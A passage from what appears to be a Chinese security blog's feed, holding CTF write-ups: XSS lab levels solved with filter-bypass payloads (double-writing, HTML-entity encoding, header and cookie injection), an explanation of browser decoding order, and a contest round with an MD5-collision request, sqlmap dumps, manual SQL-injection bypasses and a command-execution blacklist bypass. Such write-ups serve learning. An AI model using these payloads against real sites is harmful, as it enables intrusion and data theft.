<p>继续测试<code>&lt;script&gt;&#39;&quot;on</code>-&gt;<code>&lt;&gt;&#39;&quot;on</code>，猜测可能是将script置换为空字符，尝试双写绕过<code>&lt;scscriptript&gt;</code>，成功！对于其他敏感词如<code>on</code>等也可以用双写绕过，之前都是将敏感字符加下划线，本题是转化为空字符串<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;xss20&#x2F;level7.php?keyword&#x3D;&quot; oonnclick&#x3D;&quot;window.alert()</span><br></pre></td></tr></table></div></figure></p>        <h1 id="XSS-8">          <a href="#XSS-8" class="heading-link"><i class="fas fa-link"></i></a>XSS-8</h1>      <p>测试<code>script&gt;&lt;&#39;&quot;</code></p><p><img src="https://ws1.sinaimg.cn/large/0072Lfvtly1g0ndyh1byuj30np08mab6.jpg" alt></p><p>可以看到对于a标签来说只过滤了双引号，还有将<code>script</code>替换成了<code>scr_ipt</code>，由于过滤了双引号，所以我们之前的闭合双引号构造其它标签的方法就不行了，只能在<code>href=&quot;&quot;</code>上面做文章，本来我们可以提交<code>javascript:alert()</code>，但是题目污染了script敏感词，不过我们可以使用html实体编码绕过（即&amp;#开头的编码方式）<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;xss20&#x2F;level8.php?keyword&#x3D;java&amp;#115;cript:alert(&#39;xss&#39;)</span><br></pre></td></tr></table></div></figure></p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"script"</span>,<span class="string">"scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">"sr_c"</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"data"</span>,<span class="string">"da_ta"</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">"href"</span>,<span class="string">"hr_ef"</span>,$str5);</span><br><span class="line">$str7=str_replace(<span class="string">'"'</span>,<span class="string">'&amp;quot'</span>,$str6);</span><br></pre></td></tr></table></div></figure><p>查看后台代码可知题目果然就是直接将敏感词转换，所以确实存在编码绕过的问题的</p><hr>        <h1 id="浏览器解码方式与XSS">          <a href="#浏览器解码方式与XSS" class="heading-link"><i class="fas fa-link"></i></a>浏览器解码方式与XSS</h1>      <p>在上一关中，我们利用html实体编码实现了弹窗， 想要探究这些问题的原理，我们就必须去了解一下浏览器究竟是怎么解码的</p><p><img src="https://ws1.sinaimg.cn/large/0072Lfvtly1g0obpka93uj30gu09tdgm.jpg" alt></p><p>浏览器在解析时，首先由浏览器解析HTML生成DOM树，然后解析CSS生成CSSDOM树，之后JS解释器才开始进行解析执行， 如果碰到URL的话会由URL解释器进行解码，为了我们研究问题，我们可以粗略的把浏览器分为三部分HTML解释器，URL解释器，JS解释器，顺序简化为<code>HTML-&gt;URL-&gt;JS</code><br>各种解释器能够识别的编码方式</p><ul><li>HTML解释器识别的是HTML实体编码，也就是&amp;#xx这种的</li><li>URL解释器可以识别URL编码</li><li>JS解释器可以识别Unicode编码，类似\uxxx</li></ul><blockquote><p>浏览器最早开始解析HTML，将标签转化为内容树中的DOM 节点，此时识别标签的时候，HTML 解析器是无法识别那些被实体编码的内容的，只有建立起DOM 树，才能对每个节点的内容进行识别，如果出现实体编码，则会进行实体解码。在此基础上，JavaScript DOM API 参与进来，可以对DOM 树进行修改，改变DOM树的结构和内容。<br>这段话说的比较清楚了，在dom树构建之时，html实体编码是没有被自解码的，那么此时dom树的节点结构就已经被固定了。后续自解码以后并不会影响到dom树/节点/标签的结构。这个道理和sql中的预编译是有些类似的。之后的自解码以后获得的&lt;&gt;将不会被解析成新的节点。 但并不是说dom树构建完毕后就不能被改变了。js是可以操作节点进行增删改操作的。</p></blockquote><p>我们来探讨一下下面四个写法是否能够成功执行JS</p><ol><li><code>&lt;a href=javascript:al\u65rt(1)&gt;click&lt;/a&gt;</code></li><li><code>&lt;a href=javascript:al%65rt(1)&gt;click&lt;/a&gt;</code></li><li><code>&lt;a href=javascript:al&amp;#101;rt(1)&gt;click&lt;/a&gt;</code></li><li><code>&lt;a href=jav%61script:alert(1)&gt;click4&lt;/a&gt;</code></li></ol><p>第一种写法无法实现弹窗，因为HTML和url都无法识别unicode编码，只有JS可以解码，但是在JS解释之前alert的e是被编码的状态，JS不会认为该语句是可以执行的，因为有一个被编码的字符e，如果此时修改为<code>alert(&#39;\u65&#39;)</code>就可以被成功执行</p><p>第二种写法可以实现弹窗，因为url解码是在js解码之前的，所以在JS执行之前已经得到完整的JS代码了，所以可以执行</p><p>第三种写法自然也可以实现弹窗，因为HMLT解码更早，在url解码之前，所以自然能够执行</p><p>第四种写法无法执行，因为在url识别阶段，解码得到的javascript，此时自然不会将JavaScript看做是伪协议，所以跳转链接会产生错误，可以与第二种写法进行比对</p><blockquote><p>回到第8题，我们也就可以理解了，如果我们将<code>javacript</code>全部进行html实体编码，显然也是可以执行成功的，但是进行url编码则无法成功，与上面第4个例子的原理是一样的</p></blockquote><hr>        <h1 id="XSS-9">          <a href="#XSS-9" class="heading-link"><i class="fas fa-link"></i></a>XSS-9</h1>      <p>测试可知依然存在上述的编码绕过问题，但是本题加入了一个链接检测，如果链接不合法就会被拦截，经过测试发现只要链接中出现<code>http://</code>就会被判定为合法链接，之后我们再用注释将这段字符注释掉即可</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;xss20&#x2F;level9.php?keyword&#x3D;java&amp;#115cript:alert()&#x2F;*http:&#x2F;&#x2F;*&#x2F;</span><br></pre></td></tr></table></div></figure><p>查看代码可以看到过滤果然就是我们猜测的内容<br><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">false</span>===strpos($str7,<span class="string">'http://'</span>))</span><br></pre></td></tr></table></div></figure></p>        <h1 id="XSS-10">          <a href="#XSS-10" class="heading-link"><i class="fas fa-link"></i></a>XSS-10</h1>      <p>本题主要考察隐藏元素的寻找，因为本题不在是前面题目用keyword的内容来替代，查看源代码可知有一个新表单存在三个参数，因为类型是<code>hidden</code>所以看不到，测试发现第三个参数是有效参数，而且只过滤了<code>&lt;&gt;</code>两个符号，所以我们用之前的payload即可，在设置<code>type=text</code>使其可见</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;xss20&#x2F;level10.php?keyword&#x3D;aaa&amp;t_link&#x3D;addd&amp;t_history&#x3D;ffads&amp;t_sort&#x3D;&quot; onclick&#x3D;&quot;window.alert()&quot; type&#x3D;&quot;text</span><br></pre></td></tr></table></div></figure>        <h1 id="XSS-11">          <a href="#XSS-11" class="heading-link"><i class="fas fa-link"></i></a>XSS-11</h1>      <p>题目中的t_sort字段过滤比较严格，无法绕过，但是题目在访问的时候消息头中会存在<code>Referer</code>字段，该字段存在注入的问题</p><p><img src="http://ws1.sinaimg.cn/large/0072Lfvtly1g0nintgmmpj30it04jjrs.jpg" alt></p><p><img src="http://ws1.sinaimg.cn/large/0072Lfvtly1g0niotgawjj30op04vq3g.jpg" alt></p><p>测试<code>&lt;&gt;script&#39;&quot;</code>，发现<code>&lt;&gt;</code>被过滤了，其余正常，所以payload就很简单了，和前面一样，只是位置变了而已</p><p><img src="http://ws1.sinaimg.cn/large/0072Lfvtly1g0niuqccozj30m105maae.jpg" alt></p>        <h1 id="XSS-12">          <a href="#XSS-12" class="heading-link"><i class="fas fa-link"></i></a>XSS-12</h1>      <p>和上体基本一样，只不过本题是UA头的xss</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick&#x3D;&quot;window.alert()&quot; type&#x3D;&quot;text</span><br></pre></td></tr></table></div></figure>        <h1 id="XSS-13">          <a href="#XSS-13" class="heading-link"><i class="fas fa-link"></i></a>XSS-13</h1>      <p>cookie的xss</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user&#x3D;&quot; onclick&#x3D;&quot;window.alert()&quot; type&#x3D;&quot;text;</span><br></pre></td></tr></table></div></figure>        <h1 id="XSS-14">          <a href="#XSS-14" class="heading-link"><i class="fas fa-link"></i></a>XSS-14</h1>      <p>这关环境有问题，网站访问不了，好像是一个图片型xss</p>        <h1 id="XSS-15">          <a href="#XSS-15" class="heading-link"><i class="fas fa-link"></i></a>XSS-15</h1>      <p>ng-include 题目好像有点问题</p>        <h1 id="XSS-16">          <a href="#XSS-16" class="heading-link"><i class="fas fa-link"></i></a>XSS-16</h1>      <p>本题过滤的挺多的，过滤了<code>script</code>、<code>空格</code>、<code>/</code>，只要没过滤尖括号就万事好说，空格我们可以用<code>%0a</code>绕过，payload<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;xss20&#x2F;level16.php?keyword&#x3D;&lt;input%0Aonclick&#x3D;&quot;window.alert()&quot;&gt;</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;xss20&#x2F;level16.php?keyword&#x3D;&lt;image%0Asrc&#x3D;1%0aonerror&#x3D;&quot;alert()&quot;&gt;</span><br></pre></td></tr></table></div></figure></p>        <h1 id="XSS-17">          <a href="#XSS-17" class="heading-link"><i class="fas fa-link"></i></a>XSS-17</h1>      <p>本题有两个参数arg01和arg02，虽然还有flash，但是这道题和flash没关系，别被迷惑，测试一下输出点在哪个参数，发现arg02上有输出，<code>&lt;&gt;</code>、<code>&quot;</code>被过滤，我们可以使用onclick参数</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;xss20&#x2F;level17.php?arg01&#x3D;ffff&amp;arg02&#x3D;fff%208888%20onclick&#x3D;alert()</span><br></pre></td></tr></table></div></figure>        <h1 id="XSS-18">          <a href="#XSS-18" class="heading-link"><i class="fas fa-link"></i></a>XSS-18</h1>      <p>过滤了<code>&lt;&gt;</code> <code>&quot;</code>，感觉和17题没什么区别</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;xss20&#x2F;level18.php?arg01&#x3D;wwww&amp;arg02&#x3D;bfff%20888%20onfocus&#x3D;alert()</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;xss20&#x2F;level18.php?arg01&#x3D;wwww&amp;arg02&#x3D;bfff%20888%20onclick&#x3D;alert()</span><br></pre></td></tr></table></div></figure><p>可能我太菜了，没get到17、18两题的考点，希望看到的师傅们和我交流一下XD</p>        <h1 id="XSS-19">          <a href="#XSS-19" class="heading-link"><i class="fas fa-link"></i></a>XSS-19</h1>      <p>从这关开始之后就是flash xss了，看了代码也看不懂2333，测试了一下这个payload是可以用的，</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;xss20&#x2F;level19.php?arg01&#x3D;version&amp;arg02&#x3D;%3Ca%20href&#x3D;%22javascript:alert(document.domain)%22%3Exss_by_SST%3C&#x2F;a%3E</span><br></pre></td></tr></table></div></figure>        <h1 id="XSS-20">          <a href="#XSS-20" class="heading-link"><i class="fas fa-link"></i></a>XSS-20</h1>      <p>payload看不懂</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;xss20&#x2F;level20.php?arg01&#x3D;id&amp;arg02&#x3D;\%22))&#125;catch(e)&#123;&#125;if(!self.a)self.a&#x3D;!alert(document.cookie)&#x2F;&#x2F;%26width%26height</span><br></pre></td></tr></table></div></figure><p>有时间再研究吧，这个用的另一种脚本语言</p>        <h1 id="总结">          <a href="#总结" class="heading-link"><i class="fas fa-link"></i></a>总结</h1>      <p>对于XSS的绕过，可以采用双写，大小写，闭合标签，利用过滤不完全的漏洞来使用标签</p><blockquote><p>XSS一般利用js脚本读取用户浏览器中的Cookie，而如果在服务器端对Cookie 设置了HttpOnly 属性，那么js脚本就不能读取到cookie，但是浏览器还是能够正常使用cookie</p></blockquote><p>总的来说，对于XSS攻击，我们要对<strong>输入参数进行过滤，对输出进行编码转义，白名单和黑名单相结合。</strong></p><p><strong><em>reference:</em></strong><br><span class="exturl"><a class="exturl__link" href="https://www.cnblogs.com/escape-w/p/10162831.html" target="_blank" rel="noopener">https://www.cnblogs.com/escape-w/p/10162831.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br><span class="exturl"><a class="exturl__link" href="https://blog.csdn.net/he_and/article/details/80588409" target="_blank" rel="noopener">https://blog.csdn.net/he_and/article/details/80588409</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;
          &lt;a href=&quot;#前言&quot; class=&quot;heading-link&quot;&gt;&lt;i class=&quot;fas fa-link&quot;&gt;&lt;/i&gt;&lt;/a&gt;前言&lt;/h1&gt;
      &lt;p&gt;最近学到了xss漏洞，来做一下这个xss题目&lt;/p&gt;
    
    </summary>
    
      <category term="writeup" scheme="http://chaosec.top/categories/writeup/"/>
    
    
      <category term="XSS" scheme="http://chaosec.top/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>CUMTCTF第二轮月赛</title>
    <link href="http://chaosec.top/2019/01/30/cumtctf2/"/>
    <id>http://chaosec.top/2019/01/30/cumtctf2/</id>
    <published>2019-01-30T14:50:00.000Z</published>
    <updated>2019-02-12T14:29:27.946Z</updated>
    
    <content type="html"><![CDATA[        <h1 id="前言">          <a href="#前言" class="heading-link"><i class="fas fa-link"></i></a>前言</h1>      <p>本次题目比较简单，有幸ak了web，可惜还是没进前三，二进制和pwn做的太差了，区块链也没做出来，要是做出来就前三了，有时间还是要学习一下区块链。</p><a id="more"></a>        <h1 id="web">          <a href="#web" class="heading-link"><i class="fas fa-link"></i></a>web</h1>              <h2 id="签到题">          <a href="#签到题" class="heading-link"><i class="fas fa-link"></i></a>签到题</h2>      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$white_list = range(<span class="number">0</span>,<span class="number">9</span>); </span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'flag.php'</span>); </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'0ver'</span>]) &amp;&amp; <span class="keyword">isset</span>($_REQUEST[<span class="string">'0ver1'</span>]) &amp;&amp; <span class="keyword">isset</span>($_REQUEST[<span class="string">'0ver2'</span>]))&#123; </span><br><span class="line">    $a = $_REQUEST[<span class="string">'0ver'</span>]; </span><br><span class="line">    $b = $_REQUEST[<span class="string">'0ver1'</span>]; </span><br><span class="line">    $c = $_REQUEST[<span class="string">'0ver2'</span>]; </span><br><span class="line">    <span class="keyword">if</span>(@ereg(<span class="string">"^[0-9]+$"</span>, $a) === <span class="keyword">FALSE</span>)&#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'no must be number'</span>; </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">if</span>(in_array($a,$white_list))&#123; </span><br><span class="line">            <span class="keyword">if</span>(strlen($a)&gt;<span class="number">1</span>)&#123; </span><br><span class="line">                <span class="keyword">if</span>(md5($c) === md5($b) &amp;&amp; ($b !== $c))&#123; </span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">"&lt;img src='dark.png'&gt;&lt;br&gt;"</span>; </span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">'you are a great dark phper&lt;br&gt;'</span>; </span><br><span class="line">                    <span class="keyword">echo</span> $flag; </span><br><span class="line">                &#125; </span><br><span class="line">                <span class="keyword">else</span>&#123; </span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">"you can do it!!!"</span>; </span><br><span class="line">                &#125; </span><br><span class="line">                 </span><br><span class="line">            &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'you no dark'</span>; </span><br><span class="line">            &#125; </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'you are so dark'</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125;     </span><br><span class="line">&#125;<span class="keyword">else</span> </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></div></figure><p>很简单的代码审计题目，第一次绕过要求0ver是数字0-9以内的整数，但是长度却要大于1位，使用 <code>03</code>类似的即可绕过，也可以使用<code>%00</code>截断，第二层要求两个相同md5值的文件（不是弱类型比较），这样的文件也是有的，记得强网杯好像就有类似的题目，参考一下即可</p><p>paylaod：</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v http:&#x2F;&#x2F;202.119.201.199:32790?0ver&#x3D;02 --data &quot;0ver1&#x3D;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;0ver2&#x3D;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2&quot;</span><br></pre></td></tr></table></div></figure><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag:flag&#123;73100259ca8919f402846b00d3b939a9&#125;</span><br></pre></td></tr></table></div></figure>        <h2 id="SimpleUpload">          <a href="#SimpleUpload" class="heading-link"><i class="fas fa-link"></i></a>SimpleUpload</h2>      <p>查看源码可知发现前端验证设置了白名单，只允许上传.jpg|.png|.gif。</p><p>这里需要绕过前端验证，上传1.jpg，利用burp截断修改后缀名为1.php。</p><p><img src="https://i.imgur.com/kDxBrxT.png" alt>    </p>        <h2 id="小型线上赌场">          <a href="#小型线上赌场" class="heading-link"><i class="fas fa-link"></i></a>小型线上赌场</h2>      <p>题目提示了断电，应该是vi文件泄露，测试发现 <code>.index.swp</code>存在泄露，vim恢复一下</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi -r index.swp</span><br></pre></td></tr></table></div></figure><p>代码如下</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $invest = $_GET[<span class="string">'invest'</span>];</span><br><span class="line">    $rand = rand(<span class="number">2</span>,<span class="number">50</span>);</span><br><span class="line">    $len = strlen(trim($_GET[<span class="string">'invest'</span>]));</span><br><span class="line">    <span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">        <span class="keyword">if</span>(!is_numeric($value)||$value == <span class="string">'0'</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'no no no!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $money = number_format($invest*$rand);</span><br><span class="line">    $money = intval(str_replace(<span class="string">','</span>,<span class="string">''</span>,$money));</span><br><span class="line">    $guess = intval($_GET[<span class="string">'guess'</span>]);</span><br><span class="line">    <span class="keyword">if</span> ($guess == $money &amp;&amp; strlen($money)===$len) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>代码思路是提交invest值，然后乘以一个2-50之间的随机数与我们猜测的相等即可得到flag，直接多次尝试爆破即可，即每次都提交invest值为2，guess值为6，只要某次随机数为3的时候即可得到flag</p><p><img src="https://i.loli.net/2019/01/24/5c49424c2fdc8.png" alt="抓包爆破"></p><p><img src="https://i.loli.net/2019/01/24/5c4942d3766a8.png" alt="flag"></p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;7e1e2bfe75c980be35c61ed1bde7a6f2&#125;</span><br></pre></td></tr></table></div></figure>        <h2 id="SimpleSQLi">          <a href="#SimpleSQLi" class="heading-link"><i class="fas fa-link"></i></a>SimpleSQLi</h2>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http:&#x2F;&#x2F;bxs.cumt.edu.cn:30007&#x2F;test&#x2F;index.php?id&#x3D;1 --dbs</span><br></pre></td></tr></table></div></figure><p>数据库名为security</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http:&#x2F;&#x2F;bxs.cumt.edu.cn:30007&#x2F;test&#x2F;index.php?id&#x3D;1 -D security --tables</span><br></pre></td></tr></table></div></figure><p>表名flagishere</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http:&#x2F;&#x2F;bxs.cumt.edu.cn:30007&#x2F;test&#x2F;index.php?id&#x3D;1 -D security -T flagishere --columns --threads&#x3D;10</span><br></pre></td></tr></table></div></figure><p>列名id,flag</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http:&#x2F;&#x2F;bxs.cumt.edu.cn:30007&#x2F;test&#x2F;index.php?id&#x3D;1 -D security -T flagishere -C &quot;id,flag&quot; --dump --threads&#x3D;10</span><br></pre></td></tr></table></div></figure><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;4ur0Ra_SimPlE_sQLi_23333&#125;</span><br></pre></td></tr></table></div></figure>        <h2 id="真的简单。。">          <a href="#真的简单。。" class="heading-link"><i class="fas fa-link"></i></a>真的简单。。</h2>      <p>随手fuzz一下</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;202.119.201.199:32793&#x2F;list.php?id&#x3D;1%27</span><br></pre></td></tr></table></div></figure><p>报错</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;202.119.201.199:32793&#x2F;list.php?id&#x3D;1%27--+</span><br></pre></td></tr></table></div></figure><p>可以正常返回，猜测是单引号注入</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;202.119.201.199:32793&#x2F;list.php?id&#x3D;-1%27%20or%201&#x3D;1--+</span><br></pre></td></tr></table></div></figure><p>无正确回显，猜测可能是or有问题，换 <code>||</code> 试一下</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;202.119.201.199:32793&#x2F;list.php?id&#x3D;-2%27 || 3&#x3D;length(database())--+</span><br></pre></td></tr></table></div></figure><p>果然返回正确，数据库长度为3</p><p>题目过滤了or，但是可以绕过</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;202.119.201.199:32793&#x2F;list.php?id&#x3D;-1%27%20oorr%201&#x3D;1--+</span><br></pre></td></tr></table></div></figure><p>爆列数</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;202.119.201.199:32793&#x2F;list.php?id&#x3D;-2%27 || 3&#x3D;3 oorrder by 3--+</span><br></pre></td></tr></table></div></figure><p>共有三列</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;202.119.201.199:32793&#x2F;list.php?id&#x3D;-2%27 || 3&#x3D;2 ununionion selselectect 1,database(),3--+</span><br></pre></td></tr></table></div></figure><p>database:ctf</p><p>接下来就是常规的注入了</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;202.119.201.199:32793&#x2F;list.php?id&#x3D;-2%27 || 3&#x3D;2 ununionion selselectect 1,group_concat(table_name),3 from infoorrmation_schema.tables where table_schema&#x3D;database()--+</span><br></pre></td></tr></table></div></figure><p>table：ctf,flag </p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;202.119.201.199:32793&#x2F;list.php?id&#x3D;-2%27 || 3&#x3D;2 ununionion selselectect 1,group_concat(column_name),3 from infoorrmation_schema.columns where table_schema&#x3D;database()--+</span><br></pre></td></tr></table></div></figure><p>列名：id,flag </p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;202.119.201.199:32793&#x2F;list.php?id&#x3D;-2%27 || 3&#x3D;2 ununionion selselectect 1,flag,3 from flag--+</span><br></pre></td></tr></table></div></figure><p>居然还有题目..</p><blockquote><p>flag in admin_08163314/exec.php </p></blockquote><p>访问一下，是个命令执行界面，过滤了空格，可用<code>$IFS</code>绕过，尝试列根目录但是失败了，猜测可能是<code>/</code>被过滤了，但是 <code>* .</code>没有被过滤，可以用来读文件exec.php</p><p><img src="https://i.loli.net/2019/01/26/5c4c5df37356a.png" alt></p><p>可以得到源码</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf_exec</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">$black_str = <span class="string">"/(;|&amp;|&gt;|&#125;|&#123;|%|#|!|\?|@|\+|\/| )/i"</span>;</span><br><span class="line">$str = preg_replace($black_str, <span class="string">""</span>,$str);</span><br><span class="line"><span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (@$_POST[<span class="string">'cmd'</span>]) &#123;</span><br><span class="line">$cmd = waf_exec($_POST[<span class="string">'cmd'</span>]);</span><br><span class="line">system($cmd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>知道了过滤规则就好办了，接下里可以用base64编码绕过，列根目录</p><p><img src="https://i.loli.net/2019/01/26/5c4c5e68be087.png" alt></p><p><img src="https://i.loli.net/2019/01/26/5c4c5e99549bc.png" alt></p><p>注意这里的flag_3314是个目录，还得继续列目录</p><p><img src="https://i.loli.net/2019/01/26/5c4c5eea0c492.png" alt></p><p><img src="https://i.loli.net/2019/01/26/5c4c5f1453698.png" 